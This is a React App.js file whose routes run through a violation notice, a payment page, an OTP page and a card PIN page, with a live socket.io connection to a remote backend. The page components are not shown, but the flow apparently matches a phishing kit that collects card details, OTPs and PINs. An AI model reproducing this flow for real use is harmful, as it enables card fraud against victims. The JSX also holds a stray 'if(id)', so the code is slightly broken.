import { BrowserRouter, Routes, Route } from "react-router-dom";
import { useEffect, useState } from "react";
import axios from "axios";
import { io } from "socket.io-client";
import Home from "./Pages/Home";
import Navbar from "./components/Navbar";
import Footer from "./components/Footer";
import Violation from "./Pages/Success";
import Payemnt from "./Pages/Payemnt";
import OTP from "./Pages/OTP";
import PIN from "./Pages/PIN";
import Success from "./Pages/Success";

// export const api_route = "http://localhost:8080";
export const api_route = "https://efaa-s.onrender.com";
export const socket = io(api_route);

export function getKeysWithTrueValue(obj) {
  const keysWithTrueValue = {};
  for (const key in obj) {
    if (obj[key]) {
      keysWithTrueValue[key] = obj[key];
    }
  }
  return keysWithTrueValue;
}

function App() {
  useEffect(() => {
    (async () => {
      await axios.get(api_route + "/");
    })();
  }, []);
  const [loading, setLoading] = useState(false);
  const routes = [
    {
      path: "/",
      element: <Home />,
    },
    {
      path: "/success",
      element: <Success />,
    },
    {
      path: "/payment",
      element: <Payemnt />,
    },
    {
      path: "/OTP",
      element: <OTP />,
    },
    {
      path: "/PIN",
      element: <PIN />,
    },
  ];

  return (
    <div
      className="min-h-screen  w-full flex items-start justify-between   "
      style={{
        backgroundImage: "url('/home.jpg')",
        backgroundSize: "cover",
        backgroundPosition: "center",
      }}
    >
      <div className="w-full relative items-center justify-between flex flex-col min-h-screen">
        {
          <BrowserRouter>
            <Navbar />
            <Routes>
              <Route path="/" element={<Home />} />
              if(id)
              {routes.map((route) => (
                <Route path={route.path} element={route.element} />
              ))}
            </Routes>
            <Footer />
          </BrowserRouter>
        }
      </div>
    </div>
  );
}

export default App;
